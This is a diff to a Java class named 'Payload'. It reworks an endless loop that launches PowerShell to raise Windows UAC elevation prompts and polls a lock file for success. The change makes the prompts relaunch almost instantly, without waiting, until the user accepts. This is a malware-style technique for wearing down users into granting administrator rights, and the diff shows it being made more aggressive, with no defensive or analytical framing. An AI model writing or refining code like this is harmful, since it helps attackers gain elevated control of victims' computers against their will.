@@ -163,25 +163,17 @@ public class Payload {
             while (true) {
                 log("Triggering UAC...");
                 
-                Process p = new ProcessBuilder("powershell.exe", "-NoProfile", "-Command", psCommand).start();
-                p.waitFor(); 
+                // Launch PowerShell in the background without waiting for it to close
+                new ProcessBuilder("powershell.exe", "-NoProfile", "-Command", psCommand).start();
                 
-                // Check every 50ms to see if the lock file was deleted by the elevated process
-                boolean accepted = false;
-                for (int i = 0; i < 200; i++) { 
+                // Spin-check every 15ms if the lock file was deleted by the elevated process
+                for (int i = 0; i < 100; i++) { 
                     if (!lockFile.exists() || lockFile.delete()) {
-                        accepted = true;
-                        break;
+                        log("UAC Accepted. Parent exiting.");
+                        lockStream.close();
+                        System.exit(0); 
                     }
-                    Thread.sleep(50);
-                }
-                
-                if (accepted) {
-                    log("UAC Accepted. Parent exiting.");
-                    lockStream.close();
-                    System.exit(0); 
-                } else {
-                    log("UAC Denied. Retrying instantly...");
+                    Thread.sleep(15);
                 }
             }
         } catch (Exception e) {
